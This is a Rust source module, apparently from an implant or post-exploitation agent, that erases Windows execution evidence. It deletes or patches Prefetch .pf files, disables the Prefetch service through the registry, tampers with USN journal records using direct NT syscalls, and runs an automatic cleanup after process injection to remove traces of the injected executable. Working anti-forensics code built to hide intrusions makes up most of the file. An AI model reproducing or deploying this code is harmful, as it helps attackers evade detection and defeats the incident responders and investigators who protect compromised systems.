    // Read journal entries in a loop.
    let mut usn_entries_found = 0usize;
    let mut current_usn: i64 = 0;

    for _ in 0..10 { // Limit iterations to prevent infinite loops
        let mut iosb2 = IoStatusBlock::default();
        read_data.start_usn = current_usn;

        let read_status = nt_syscall::syscall!(
            "NtFsControlFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb2 as *mut _ as u64,
            FSCTL_READ_USN_JOURNAL as u64,
            &mut read_data as *mut _ as u64,
            std::mem::size_of::<ReadUsnJournalData>() as u64,
            journal_buf.as_mut_ptr() as u64,
            journal_buf_size as u64,
        )
        .map_err(|e| format!("nt_syscall resolution for FSCTL_READ_USN_JOURNAL: {e}"))?;

        if read_status != STATUS_SUCCESS {
            // Non-fatal.
            log::debug!("prefetch: USN journal read returned NTSTATUS {:#010X}", read_status as u32);
            break;
        }

        let bytes_returned = iosb2.information as usize;
        if bytes_returned < 8 {
            break;
        }

        // First 8 bytes of the output is the next USN.
        current_usn = i64::from_le_bytes([
            journal_buf[0], journal_buf[1], journal_buf[2], journal_buf[3],
            journal_buf[4], journal_buf[5], journal_buf[6], journal_buf[7],
        ]);

        // Parse USN records starting at offset 8.
        let mut offset = 8usize;
        while offset + 8 < bytes_returned {
            let record_len = u32::from_le_bytes([
                journal_buf[offset], journal_buf[offset + 1],
                journal_buf[offset + 2], journal_buf[offset + 3],
            ]);
            if record_len == 0 || offset + record_len as usize > bytes_returned {
                break;
            }

            // Check if this record references our .pf file.
            // We check the filename field if present.
            let major = u16::from_le_bytes([
                journal_buf[offset + 4], journal_buf[offset + 5],
            ]);
            if major >= 2 && major <= 4 {
                let fn_len_off = offset + 56; // approximate offset for file_name_length
                let fn_off_off = offset + 58; // approximate offset for file_name_offset
                if fn_len_off + 4 <= bytes_returned && fn_off_off + 2 <= bytes_returned {
                    let fn_len = u16::from_le_bytes([
                        journal_buf[fn_len_off], journal_buf[fn_len_off + 1],
                    ]) as usize;
                    let fn_off = u16::from_le_bytes([
                        journal_buf[fn_off_off], journal_buf[fn_off_off + 1],
                    ]) as usize;

                    if fn_len > 0 && offset + fn_off + fn_len <= bytes_returned {
                        let record_fn: Vec<u16> = (0..fn_len / 2)
                            .map(|i| {
                                let byte_off = offset + fn_off + i * 2;
                                u16::from_le_bytes([
                                    journal_buf[byte_off],
                                    journal_buf[byte_off + 1],
                                ])
                            })
                            .collect();

                        // Check if this filename matches our .pf file.
                        if record_fn.len() >= pf_name_wide.len() {
                            let tail_matches = record_fn[record_fn.len() - pf_name_wide.len()..]
                                .iter()
                                .zip(pf_name_wide.iter())
                                .all(|(&a, &b)| a.to_ascii_uppercase() == b.to_ascii_uppercase());

                            if tail_matches {
                                // Found a matching entry. Write a USN close record to
                                // cleanly mark it as closed.
                                let file_ref_off = offset + 16; // file_reference_number offset
                                if file_ref_off + 8 <= bytes_returned {
                                    let file_ref = u64::from_le_bytes([
                                        journal_buf[file_ref_off],
                                        journal_buf[file_ref_off + 1],
                                        journal_buf[file_ref_off + 2],
                                        journal_buf[file_ref_off + 3],
                                        journal_buf[file_ref_off + 4],
                                        journal_buf[file_ref_off + 5],
                                        journal_buf[file_ref_off + 6],
                                        journal_buf[file_ref_off + 7],
                                    ]);

                                    // FSCTL_WRITE_USN_CLOSE requires a USN journal ID.
                                    // Build a minimal close record: file_reference_number (8 bytes).
                                    let mut close_data = [0u8; 8];
                                    close_data.copy_from_slice(&file_ref.to_le_bytes());

                                    let _ = nt_fs_control_file(
                                        handle,
                                        FSCTL_WRITE_USN_CLOSE,
                                        close_data.as_mut_ptr() as *mut _,
                                        8,
                                        std::ptr::null_mut(),
                                        0,
                                    );

                                    usn_entries_found += 1;
                                }
                            }
                        }
                    }
                }
            }

            offset += record_len as usize;
        }

        if current_usn == 0 || current_usn == i64::MAX {
            break;
        }
    }

    let _ = nt_close(handle);

    log::debug!("prefetch: USN journal cleanup found {} matching entries", usn_entries_found);
    Ok(())
}

// ── Core cleanup operations ──────────────────────────────────────────────

/// Delete a .pf file via NtDeleteFile.
unsafe fn delete_pf_file(pf_nt_path: &[u16]) -> Result<(), String> {
    nt_delete_file(pf_nt_path)
}

/// Patch a .pf file header in-place (preferred method).
/// Maps the file, patches the header, unmaps and closes.
unsafe fn patch_pf_file(pf_nt_path: &[u16]) -> Result<(), String> {
    // Open the file for read/write.
    let file_handle = nt_open_file_rw(pf_nt_path)?;
    defer! { let _ = nt_close(file_handle); }

    // Map the file into memory.
    let (section_handle, base, view_size) = nt_map_file(file_handle)?;
    defer! {
        let _ = nt_unmap_view(base);
        let _ = nt_close(section_handle);
    }

    if view_size == 0 || view_size > MAX_PF_SIZE {
        return Err(format!(
            "patch_pf_file: invalid view size {}",
            view_size
        ));
    }

    let data = std::slice::from_raw_parts_mut(base as *mut u8, view_size);

    // Validate header.
    let version = validate_pf_header(data).ok_or_else(|| {
        format!("patch_pf_file: invalid PF header in {}", wide_to_string(pf_nt_path))
    })?;

    // Patch the header.
    patch_pf_header(data, version)?;

    log::info!(
        "prefetch: patched PF file {} (version={}, size={})",
        wide_to_string(pf_nt_path),
        version,
        view_size
    );
    Ok(())
}

/// Disable the Prefetch service by setting EnablePrefetcher to 0.
/// Returns the previous value for later restoration.
unsafe fn disable_prefetch_service() -> Result<u32, String> {
    // Open the registry key.
    let key_handle = nt_open_key(PREFETCH_REG_KEY_NT, KEY_READ | KEY_SET_VALUE)?;

    // Read current value.
    let current_value = match nt_query_value_key_dword(key_handle, ENABLE_PREFETCHER_NAME) {
        Ok(v) => v,
        Err(e) => {
            let _ = nt_close(key_handle);
            return Err(format!("Failed to read current EnablePrefetcher: {}", e));
        }
    };

    // Set to 0 (disabled).
    if let Err(e) = nt_set_value_key_dword(key_handle, ENABLE_PREFETCHER_NAME, 0) {
        let _ = nt_close(key_handle);
        return Err(format!("Failed to set EnablePrefetcher to 0: {}", e));
    }

    let _ = nt_close(key_handle);
    log::info!(
        "prefetch: disabled Prefetch service (was {})",
        current_value
    );
    Ok(current_value)
}

/// Restore the Prefetch service by setting EnablePrefetcher to a previous value.
unsafe fn restore_prefetch_service(value: u32) -> Result<(), String> {
    let key_handle = nt_open_key(PREFETCH_REG_KEY_NT, KEY_READ | KEY_SET_VALUE)?;

    if let Err(e) = nt_set_value_key_dword(key_handle, ENABLE_PREFETCHER_NAME, value) {
        let _ = nt_close(key_handle);
        return Err(format!("Failed to restore EnablePrefetcher to {}: {}", value, e));
    }

    let _ = nt_close(key_handle);
    log::info!("prefetch: restored Prefetch service to {}", value);
    Ok(())
}

/// Build an NT path for a .pf file in the Prefetch directory.
fn build_pf_nt_path(filename_wide: &[u16]) -> Vec<u16> {
    // Build: \??\C:\Windows\Prefetch\<filename>
    let mut path: Vec<u16> = PREFETCH_DIR_NT[..PREFETCH_DIR_NT.len() - 1].to_vec(); // strip null
    path.push(b'\\' as u16);
    path.extend_from_slice(filename_wide);
    path.push(0); // null terminate
    path
}

// ── Public API ───────────────────────────────────────────────────────────

/// Initialise the prefetch cleanup module from agent config.
/// Called once during agent startup.
pub fn init_from_config(config: &PrefetchConfig) {
    if !config.enabled {
        log::debug!("prefetch: module disabled by config");
        return;
    }

    let _ = CONFIG.set(PrefetchConfig {
        enabled: config.enabled,
        auto_clean_after_injection: config.auto_clean_after_injection,
        method: config.method.clone(),
        restore_service_after: config.restore_service_after,
        clean_usn_journal: config.clean_usn_journal,
    });

    INITIALIZED.store(true, Ordering::SeqCst);
    log::info!(
        "prefetch: initialised (method={:?}, auto_clean={}, usn_cleanup={})",
        config.method,
        config.auto_clean_after_injection,
        config.clean_usn_journal
    );
}

/// Returns true if the module is initialised and enabled.
pub fn is_enabled() -> bool {
    INITIALIZED.load(Ordering::SeqCst)
}

/// Clean prefetch evidence for the specified executable.
///
/// If `exe_name` is empty, all .pf files are cleaned.
/// The cleanup method is determined by the config (delete, patch, or
/// disable-service).
///
/// Returns a summary of what was done.
pub fn clean_prefetch(exe_name: &str) -> Result<String, String> {
    if !is_enabled() {
        return Err("Prefetch cleanup module not initialised".to_string());
    }

    let config = CONFIG.get().ok_or("Prefetch config not set")?;
    let mut summary = String::new();
    let mut cleaned_count = 0usize;
    let mut errors = Vec::new();

    // If method is "disable-service", disable the Prefetch service first.
    if config.method == PrefetchCleanMethod::DisableService {
        match unsafe { disable_prefetch_service() } {
            Ok(old_val) => {
                let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
                *saved = Some(old_val);
                summary.push_str(&format!(
                    "Disabled Prefetch service (was {}). ",
                    old_val
                ));
            }
            Err(e) => {
                errors.push(format!("Failed to disable Prefetch service: {}", e));
            }
        }
    }

    // Open the Prefetch directory.
    let dir_handle = match unsafe { nt_open_directory(PREFETCH_DIR_NT) } {
        Ok(h) => h,
        Err(e) => {
            return Err(format!(
                "Failed to open Prefetch directory: {}. \
                 This is normal if Prefetch is disabled on the target system.",
                e
            ));
        }
    };
    defer! { let _ = unsafe { nt_close(dir_handle) }; }

    // Enumerate .pf files.
    let files = match unsafe { nt_enumerate_files(dir_handle) } {
        Ok(f) => f,
        Err(e) => {
            return Err(format!("Failed to enumerate Prefetch directory: {}", e));
        }
    };

    // Filter and process matching .pf files.
    for filename_wide in &files {
        let filename = wide_to_string(filename_wide);

        // Check .pf extension (case-insensitive).
        if !filename.to_uppercase().ends_with(".PF") {
            continue;
        }

        // If a specific exe_name was given, check for a match.
        if !exe_name.is_empty() && !pf_matches_exe(&filename, exe_name) {
            continue;
        }

        // Build the full NT path.
        let pf_path = build_pf_nt_path(filename_wide);

        // Apply the configured cleanup method.
        let result = match config.method {
            PrefetchCleanMethod::Delete => unsafe { delete_pf_file(&pf_path) },
            PrefetchCleanMethod::Patch => unsafe { patch_pf_file(&pf_path) },
            PrefetchCleanMethod::DisableService => {
                // When using disable-service method, we also delete the file.
                unsafe { delete_pf_file(&pf_path) }
            }
        };

        match result {
            Ok(()) => {
                cleaned_count += 1;
                log::info!("prefetch: cleaned {} ({:?})", filename, config.method);
            }
            Err(e) => {
                errors.push(format!("{}: {}", filename, e));
                log::warn!("prefetch: failed to clean {}: {}", filename, e);
            }
        }

        // USN journal cleanup.
        if config.clean_usn_journal {
            if let Err(e) = unsafe { clean_usn_for_pf(&pf_path) } {
                log::debug!("prefetch: USN cleanup failed for {}: {}", filename, e);
                // Non-fatal — best effort.
            }
        }
    }

    // Restore the Prefetch service if we disabled it.
    if config.method == PrefetchCleanMethod::DisableService && config.restore_service_after {
        let saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
        if let Some(old_val) = *saved {
            drop(saved);
            if let Err(e) = unsafe { restore_prefetch_service(old_val) } {
                errors.push(format!("Failed to restore Prefetch service: {}", e));
            } else {
                summary.push_str(&format!("Restored Prefetch service to {}. ", old_val));
            }
        }
    }

    // Build result summary.
    summary.push_str(&format!(
        "Cleaned {} .pf file(s). ",
        cleaned_count
    ));
    if !errors.is_empty() {
        summary.push_str(&format!("Errors: {} ", errors.len()));
        for e in &errors {
            summary.push_str(&format!("[{}] ", e));
        }
    }

    if cleaned_count > 0 {
        Ok(summary)
    } else if errors.is_empty() {
        if exe_name.is_empty() {
            Ok("No .pf files found in Prefetch directory".to_string())
        } else {
            Ok(format!("No .pf files matching '{}' found", exe_name))
        }
    } else {
        Err(summary)
    }
}

/// Disable the Prefetch service (sets EnablePrefetcher to 0).
/// Saves the previous value for later restoration.
pub fn disable_prefetch() -> Result<String, String> {
    if !is_enabled() {
        return Err("Prefetch cleanup module not initialised".to_string());
    }

    match unsafe { disable_prefetch_service() } {
        Ok(old_val) => {
            let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
            *saved = Some(old_val);
            Ok(format!(
                "Prefetch service disabled (EnablePrefetcher was {})",
                old_val
            ))
        }
        Err(e) => Err(format!("Failed to disable Prefetch service: {}", e)),
    }
}

/// Restore the Prefetch service to its previous state.
pub fn restore_prefetch() -> Result<String, String> {
    if !is_enabled() {
        return Err("Prefetch cleanup module not initialised".to_string());
    }

    let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
    match *saved {
        Some(old_val) => {
            *saved = None;
            drop(saved);
            match unsafe { restore_prefetch_service(old_val) } {
                Ok(()) => Ok(format!(
                    "Prefetch service restored to EnablePrefetcher={}",
                    old_val
                )),
                Err(e) => Err(format!("Failed to restore Prefetch service: {}", e)),
            }
        }
        None => Err("No saved Prefetcher value to restore".to_string()),
    }
}

/// Automatic prefetch cleanup after injection.
///
/// Called from handlers.rs after a successful injection.  Cleans .pf
/// evidence for the injected process executable.
///
/// This is a best-effort operation — errors are logged but not propagated.
pub fn auto_clean_after_injection(process_name: &str) {
    if !is_enabled() {
        return;
    }

    let config = match CONFIG.get() {
        Some(c) => c,
        None => return,
    };

    if !config.auto_clean_after_injection {
        return;
    }

    // Extract just the executable name from a potential full path.
    let exe_name = process_name
        .rsplit(|c| c == '\\' || c == '/')
        .next()
        .unwrap_or(process_name);

    log::info!(
        "prefetch: auto-cleanup triggered for injected process '{}'",
        exe_name
    );

    match clean_prefetch(exe_name) {
        Ok(summary) => log::info!("prefetch: auto-cleanup result: {}", summary),
        Err(e) => log::warn!("prefetch: auto-cleanup failed: {}", e),
    }
}

/// Shut down the prefetch cleanup module.
/// Restores the Prefetch service if it was disabled.
pub fn shutdown() {
    if !is_enabled() {
        return;
    }

    let config = CONFIG.get();
    if let Some(c) = config {
        if c.restore_service_after {
            let mut saved = SAVED_PREFETCHER_VALUE.lock().unwrap();
            if let Some(old_val) = *saved {
                *saved = None;
                drop(saved);
                match unsafe { restore_prefetch_service(old_val) } {
                    Ok(()) => log::info!("prefetch: restored Prefetch service on shutdown"),
                    Err(e) => log::warn!("prefetch: failed to restore service on shutdown: {}", e),
                }
            }
        }
    }

    INITIALIZED.store(false, Ordering::SeqCst);
    log::info!("prefetch: module shut down");
}

// ── Defer macro (simple scope guard) ─────────────────────────────────────

macro_rules! defer {
    ($($body:stmt);+ $(;)?) => {
        struct _DeferGuard<F: FnMut()>(core::mem::ManuallyDrop<F>);
        impl<F: FnMut()> Drop for _DeferGuard<F> {
            fn drop(&mut self) {
                let mut f = unsafe { core::mem::ManuallyDrop::take(&mut self.0) };
                f();
            }
        }
        let _guard = _DeferGuard(core::mem::ManuallyDrop::new(|| { $($body);+ }));
    };
}

// ── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exe_name_from_pf_filename() {
        assert_eq!(
            exe_name_from_pf_filename("CMD.EXE-12345678.PF"),
            Some("CMD.EXE".to_string())
        );
        assert_eq!(
            exe_name_from_pf_filename("NOTEPAD.EXE-ABCDEF01.PF"),
            Some("NOTEPAD.EXE".to_string())
        );
        assert_eq!(
            exe_name_from_pf_filename("SVCHOST.EXE-DEADBEEF.pf"),
            Some("SVCHOST.EXE".to_string())
        );
        assert_eq!(exe_name_from_pf_filename("NOPF.txt"), None);
    }

    #[test]
    fn test_pf_matches_exe() {
        assert!(pf_matches_exe("CMD.EXE-12345678.PF", "cmd.exe"));
        assert!(pf_matches_exe("CMD.EXE-12345678.PF", "CMD.EXE"));
        assert!(pf_matches_exe("CMD.EXE-12345678.PF", "CMD"));
        assert!(!pf_matches_exe("CMD.EXE-12345678.PF", "NOTEPAD.EXE"));
    }

    #[test]
    fn test_validate_pf_header() {
        // Valid MAM v26 header.
        let mut header = vec![0u8; 20];
        header[0] = b'M';
        header[1] = b'A';
        header[2] = b'M';
        header[3] = 0;
        header[4..8].copy_from_slice(&26u32.to_le_bytes());
        assert_eq!(validate_pf_header(&header), Some(26));

        // Valid v30 header.
        header[4..8].copy_from_slice(&30u32.to_le_bytes());
        assert_eq!(validate_pf_header(&header), Some(30));

        // Invalid signature.
        header[0] = b'X';
        assert_eq!(validate_pf_header(&header), None);

        // Too short.
        assert_eq!(validate_pf_header(&[0u8; 10]), None);
    }

    #[test]
    fn test_wide_to_string() {
        let wide: Vec<u16> = "Hello".encode_utf16().collect();
        assert_eq!(wide_to_string(&wide), "Hello");
    }

    #[test]
    fn test_build_pf_nt_path() {
        let filename: Vec<u16> = "CMD.EXE-12345678.PF".encode_utf16().collect();
        let path = build_pf_nt_path(&filename);
        let path_str = wide_to_string(&path);
        assert!(path_str.contains("Prefetch"));
        assert!(path_str.contains("CMD.EXE-12345678.PF"));
    }
}
